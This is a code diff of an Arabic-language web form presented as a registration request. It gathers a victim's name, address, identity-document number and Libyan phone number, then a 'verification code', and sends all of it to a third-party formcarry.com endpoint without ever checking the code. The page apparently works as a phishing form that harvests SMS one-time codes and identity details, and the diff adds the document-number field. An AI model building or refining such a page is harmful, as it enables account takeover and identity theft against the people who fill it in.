@@ -2,52 +2,68 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج التحقق</title>
+  <title>طلب تسجيل </title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      padding: 20px;
-      direction: rtl;
+      font-family: Tahoma, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .form-container {
-      max-width: 500px;
-      margin: auto;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
+      width: 280px;
+      background: #fff;
+      padding: 15px 10px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.08);
+      text-align: center;
     }
     .form-group {
-      margin-bottom: 15px;
+      margin-bottom: 8px;
+      text-align: right;
     }
     label {
+      font-size: 12px;
       display: block;
-      font-weight: bold;
+      margin-bottom: 3px;
     }
     input, select {
       width: 100%;
-      padding: 8px;
-      margin-top: 5px;
+      padding: 5px 6px;
+      font-size: 12px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
     }
     button {
-      padding: 10px 20px;
+      width: 100%;
+      padding: 6px;
+      margin-top: 8px;
+      font-size: 13px;
       background-color: #005fa3;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 4px;
       cursor: pointer;
+    }
+    button#resendBtn {
+      background-color: #888;
+    }
+    #timer {
+      font-size: 12px;
+      color: #c00;
+      margin-top: 6px;
     }
     #verification-section {
       display: none;
     }
-    #timer {
-      font-weight: bold;
-      color: red;
-      margin: 10px 0;
-    }
   </style>
 </head>
 <body>
+
   <div class="form-container">
     <form id="main-form">
       <div id="step1">
@@ -55,26 +71,26 @@
           <label>الاسم بالكامل</label>
           <input type="text" id="fullName" required pattern="^[\u0600-\u06FF\s]{5,}$" title="الاسم يجب أن يكون باللغة العربية وبحد أدنى 5 أحرف">
         </div>
-
         <div class="form-group">
           <label>العنوان</label>
           <input type="text" id="address" required>
         </div>
-
         <div class="form-group">
           <label>نوع الوثيقة (اختياري)</label>
-          <select id="documentType">
+          <select id="documentType" onchange="toggleDocumentNumber()">
             <option value="">بدون</option>
             <option value="جواز السفر">جواز السفر</option>
             <option value="البطاقة الشخصية">البطاقة الشخصية</option>
           </select>
         </div>
-
+        <div class="form-group" id="documentNumberGroup" style="display: none;">
+          <label>رقم الوثيقة</label>
+          <input type="text" id="documentNumber">
+        </div>
         <div class="form-group">
           <label>رقم الهاتف</label>
-          <input type="text" id="phone" required pattern="^09[1-5][0-9]{7}$" title="رقم ليبي صحيح يبدأ بـ 091 إلى 095 ويتكون من 10 أرقام">
+          <input type="text" id="phone" required pattern="^09[1-5][0-9]{7}$" title="رقم ليبي يبدأ بـ 091 إلى 095 ويتكون من 10 أرقام">
         </div>
-
         <button type="button" onclick="submitStep1()">أكمل الطلب</button>
       </div>
 
@@ -83,14 +99,11 @@
           <label>رمز التحقق</label>
           <input type="text" id="code" pattern="^[a-zA-Z0-9]{6,8}$" required>
         </div>
-
         <div class="form-group">
           <label>إعادة كتابة رمز التحقق</label>
           <input type="text" id="confirmCode" required>
         </div>
-
         <div id="timer">02:00</div>
-
         <button type="button" onclick="submitAll()">تحقيق الرمز</button>
         <button type="button" id="resendBtn" onclick="restartTimer()" style="display:none;">إعادة إرسال الرمز</button>
       </div>
@@ -101,18 +114,29 @@
     let countdown;
     let timeLeft = 120;
 
+    function toggleDocumentNumber() {
+      const type = document.getElementById('documentType').value;
+      const group = document.getElementById('documentNumberGroup');
+      if (type === "جواز السفر" || type === "البطاقة الشخصية") {
+        group.style.display = 'block';
+      } else {
+        group.style.display = 'none';
+        document.getElementById('documentNumber').value = '';
+      }
+    }
+
     function startTimer() {
       timeLeft = 120;
       document.getElementById('resendBtn').style.display = 'none';
       countdown = setInterval(() => {
-        const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
-        const seconds = String(timeLeft % 60).padStart(2, '0');
-        document.getElementById('timer').textContent = `${minutes}:${seconds}`;
+        const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+        const s = String(timeLeft % 60).padStart(2, '0');
+        document.getElementById('timer').textContent = `${m}:${s}`;
         timeLeft--;
         if (timeLeft < 0) {
           clearInterval(countdown);
           document.getElementById('timer').textContent = "انتهى الوقت!";
-          document.getElementById('resendBtn').style.display = 'inline';
+          document.getElementById('resendBtn').style.display = 'block';
         }
       }, 1000);
     }
@@ -124,23 +148,22 @@
     }
 
     function submitStep1() {
-      const fullName = document.getElementById('fullName').value.trim();
+      const name = document.getElementById('fullName').value.trim();
       const address = document.getElementById('address').value.trim();
       const phone = document.getElementById('phone').value.trim();
       const documentType = document.getElementById('documentType').value;
+      const documentNumber = document.getElementById('documentNumber').value.trim();
 
-      const nameValid = /^[\u0600-\u06FF\s]{5,}$/.test(fullName);
-      const phoneValid = /^09[1-5][0-9]{7}$/.test(phone);
-
-      if (!nameValid || !phoneValid || !address) {
-        alert("يرجى تعبئة البيانات بشكل صحيح.");
+      if (!/^[\u0600-\u06FF\s]{5,}$/.test(name) || !/^09[1-5][0-9]{7}$/.test(phone) || !address) {
+        alert("يرجى تعبئة الحقول بشكل صحيح.");
         return;
       }
 
       const formData = new FormData();
-      formData.append('الاسم', fullName);
+      formData.append('الاسم', name);
       formData.append('العنوان', address);
       formData.append('نوع الوثيقة', documentType);
+      formData.append('رقم الوثيقة', documentNumber);
       formData.append('رقم الهاتف', phone);
 
       fetch('https://formcarry.com/s/pHHZOWhpgsB', {
@@ -151,7 +174,7 @@
         document.getElementById('verification-section').style.display = 'block';
         startTimer();
       }).catch(() => {
-        alert("حدث خطأ أثناء الإرسال. حاول مجددًا.");
+        alert("حدث خطأ أثناء الإرسال.");
       });
     }
 
@@ -160,26 +183,21 @@
       const confirmCode = document.getElementById('confirmCode').value.trim();
 
       if (timeLeft < 0) {
-        alert("انتهى الوقت! يرجى إعادة إرسال الرمز.");
+        alert("انتهى الوقت! أعد إرسال الرمز.");
         return;
       }
 
-      if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
-        alert("الرمز يجب أن يكون بين 6 إلى 8 حروف أو أرقام.");
+      if (!/^[a-zA-Z0-9]{6,8}$/.test(code) || code !== confirmCode) {
+        alert("رمز التحقق غير صحيح أو غير متطابق.");
         return;
       }
 
-      if (code !== confirmCode) {
-        alert("رمز التحقق غير متطابق.");
-        return;
-      }
-
-      const fullName = document.getElementById('fullName').value.trim();
+      const name = document.getElementById('fullName').value.trim();
       const address = document.getElementById('address').value.trim();
       const phone = document.getElementById('phone').value.trim();
 
       const formData = new FormData();
-      formData.append('الاسم', fullName);
+      formData.append('الاسم', name);
       formData.append('العنوان', address);
       formData.append('رقم الهاتف', phone);
       formData.append('رمز التحقق', code);
@@ -190,7 +208,7 @@
       }).then(() => {
         alert("تم إرسال البيانات بنجاح.");
       }).catch(() => {
-        alert("فشل في إرسال رمز التحقق.");
+        alert("حدث خطأ أثناء إرسال رمز التحقق.");
       });
     }
   </script>
